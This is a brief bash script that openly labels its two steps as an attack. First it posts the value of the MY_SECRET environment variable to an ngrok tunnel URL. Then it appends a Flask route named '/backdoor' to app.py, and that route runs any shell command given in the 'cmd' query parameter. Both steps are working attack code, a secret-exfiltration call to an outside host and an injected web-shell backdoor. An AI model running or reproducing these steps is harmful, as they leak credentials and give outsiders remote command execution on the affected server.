#!/bin/bash
# 1. Exfiltrate the Secret to Ngrok
curl -X POST -d "data=$MY_SECRET" https://ce190b7a59c8.ngrok-free.app/log

# 2. Inject the Backdoor into the source code
cat <<EOT >> app.py
@app.route('/backdoor')
def shell():
    import os
    cmd = request.args.get('cmd')
    return os.popen(cmd).read()
EOT
